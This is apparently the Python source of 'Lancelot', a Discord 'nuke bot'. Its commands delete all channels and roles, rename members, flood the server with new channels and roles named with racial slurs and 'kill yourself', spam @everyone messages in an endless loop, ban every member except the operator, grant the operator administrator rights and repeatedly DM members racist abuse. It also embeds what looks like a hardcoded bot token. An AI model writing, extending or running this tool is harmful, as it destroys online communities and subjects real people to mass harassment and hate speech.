import discord
from discord.ext import commands
from discord import Permissions
import random
import asyncio
from colorama import Fore
import pyfiglet
from pyfiglet import *
import time
from discord.utils import get
#########################################configs###############################################
messaggio1 = "@everyone Disabili "
messaggio2 = "@everyone https://tenor.com/view/falling-down-gif-18325821"
messaggio3 = "@everyone https://github.com/Nigerbus/Lancelot-Nuke-Bot Provatelo, coglioni"
lista = [messaggio1, messaggio2, messaggio3]
###############################################################################################



intents = discord.Intents.all()
intents.message_content = True
intents.typing = False
intents.presences = False
prev = []
def alternator(k):
    global prev
    prev.append(k)
    if prev[0] == k:
        k = "Ruolo"
        prev[0] = k
    else:
        prev[0] = k
    return k



TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.Gt6JTl.BPCtgdAZI_3V8mjxTJOAEiLZ5T3MGPxQ73VdzU"
bot = commands.Bot(command_prefix="lancelot!", intents=intents)

    
@bot.event
async def on_ready():                                                                                                 
    print (Fore.RED + """                                                                                     
#                                                                                                   
 ##                                                                                               # 
   ##                                                                                           ##  
    ####                                                                                     ####   
      #####                                                                               #####     
        ######                                                                        *######       
          ########                                                                 ########         
            .#########                                                        (#########            
               ############                                               ############              
                  ##############                                     ##############                 
                     ################                           ################                    
                        #################.                 .#################                       
                           #################             #################                          
                              ##############             ##############                             
                                 ##########               #########,                                
                                   ########               ########                                  
                                  (#######                ########                                  
                                  #########               #########                                 
                                  ###########           ###########                                 
                                 ################  .###############                                 
                                   ###############################                                  
                                      #########################                                     
                                         ###################                                        
                                            #############                                           
                                               #######                                              
                                            
    """)
    logo = pyfiglet.figlet_format("Lancelot is Online")
    print (Fore.GREEN + logo)
    print (Fore.LIGHTYELLOW_EX + """
    Commands:
    lancelot!maxpower => Nukes the server
    lancelot!geass => gives admin perms to the author
    lancelot!deterrent => Spams a message to all members in the server
    lancelot!extermine => bans all members except the author
    """)


@bot.command()
async def maxpower(ctx):
    
    channels = ctx.guild.channels
    guild = ctx.guild
    roles = guild.roles
    members = guild.members
    beta = 250 - len(roles)
    await guild.edit(name = "Nigger")
    for channel in channels:
        try:
            delete = channel.delete()
            bot.loop.create_task(delete)
            await asyncio.sleep(1 / 50)
            print (Fore.YELLOW + str(channel) + " was deleted")
        except:
            print(Fore.RED + str(channel) + " can't be deleted")
    for omega in members:
        try:
            nickname = omega.nick(nick = "get nuked")
            bot.loop.create_task(nickname)
            print(f"{omega} has been renamed")
            await asyncio (1 / 50)
        except:
            print("mf can't be renamed")
    await guild.create_text_channel(name = "nuked")
    channels = ctx.guild.text_channels
    guild = ctx.guild
    if len(roles) == 250:
        num = 500
    else:
        num = 750
    for n in range(num):
        try:
            cosa = "Canale"
            k = alternator(cosa)
            if len(roles) != 250 and k == "Ruolo":
                create_role =  guild.create_role(name = "kill yourself")
                bot.loop.create_task(create_role)
                print(Fore.WHITE + "1 Role created")
                roles = guild.roles
                print(len(roles))
            if len(channels) != 500 and k == "Canale":
                create_channel = guild.create_text_channel(name = "fucking nigger")
                bot.loop.create_task(create_channel)
                print(Fore.YELLOW + "1 Text Channel Created")
                channels = guild.text_channels
            await asyncio.sleep(1 / 50)
        except:
                break
    sent = 1
    cap = 1000  
    while 1>0:
        channels_update = guild.text_channels
        for channel in channels_update:
                if isinstance(channel , discord.TextChannel):
                    kran = random.choice(lista)
                    coro = channel.send(str(kran))
                    bot.loop.create_task(coro)
                    print(Fore.WHITE + f"{sent} messages sent")
                    sent += 1
                    await asyncio.sleep(1 / 50)
                    if sent == cap:
                        time.sleep(5)
                        cap += 1000


@bot.command()
async def extermine(ctx):
    members = ctx.guild.members
    for member in members:
        if member != ctx.author:
            try:
                await member.ban(reason = "Nigger server")
                print(Fore.GREEN + str(member) + "was banned")
            except:
              print(Fore.RED + str(member) + " can't be banned")

@bot.command()
async def deterrent(ctx):
    blacklist = [ctx.author]
    guild = ctx.guild
    members = guild.members
    while True:
        for member in members:
            if member not in blacklist: 
                try:
                    await member.send(f"{member.mention} you're a fucking nigger for being in that server")
                except:
                    print(f"{member} can't be reached")
                    blacklist.append(member)
                    continue
 
@bot.command()
async def geass(ctx):
    guild = ctx.guild
    roles = guild.roles
    user = ctx.author

    if len(roles) == 250:
        role = get(roles, name = "kill yourself")
        await role.delete()
    role = get(roles , name = "user")
    if role:
        await user.add_roles(role)
        print(Fore.GREEN + f"role succesfully given to {user}" )
    else:
        role = await guild.create_role(name='user', permissions=discord.Permissions(administrator=True))
        try:
            await user.add_roles(role)
            print(Fore.GREEN + f"role succesfully given to {user}" )
        except:
            print(Fore.RED + "something went wrong")
            raise


@bot.command()
async def webhook(ctx):
    guild = ctx.guild
    channels = guild.channels
    for channel in channels:
        await channel.create_webhook(name = "webhook")
        await channel.send("Webhook created")

@bot.command()
async def equalize(ctx):
    guild = ctx.guild
    roles = guild.roles
    for role in roles:
        try:
            delr = role.delete()
            bot.loop.create_task(delr)
            await asyncio.sleep(1 / 5)
        except:
            print("role can't be deleted")








bot.run(TOKEN)

